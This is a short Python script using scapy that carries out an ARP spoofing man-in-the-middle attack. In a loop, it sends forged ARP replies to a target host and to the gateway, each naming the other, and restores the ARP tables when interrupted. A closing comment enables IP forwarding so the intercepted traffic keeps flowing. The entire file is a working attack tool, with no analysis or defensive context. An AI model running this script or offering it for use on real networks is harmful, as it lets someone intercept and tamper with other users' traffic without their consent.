import scapy.all as scp
import time
import sys

def getmac(ip):
    arp_request = scp.ARP(pdst=ip)
    broadcast = scp.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scp.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


#side_ip = input("side ip: ")#192.168.0.100
#side_mac = input("side mac: ")#50:ff:20:27:41:a4
def spoof(target_ip, spoof_ip):
    target_mac = getmac(target_ip)
    packet = scp.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)#rout ip psrc = 192.168.0.1 # pdst=side_ip, hwdst = side_mac
    scp.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = getmac(destination_ip)
    source_mac = getmac(source_ip)
    packet = scp.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scp.send(packet, count=4, verbose=False)

target_ip = "192.168.0.100"#side user
gateway_ip = "192.168.0.1"#router

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)#to side user
        spoof(gateway_ip, target_ip)#to router #for/this ip
        sent_packets_count+=2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ..... Resetting ARP tables..... Please wait.")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)







#echo 1 > /proc/sys/net/ipv4/ip_forward
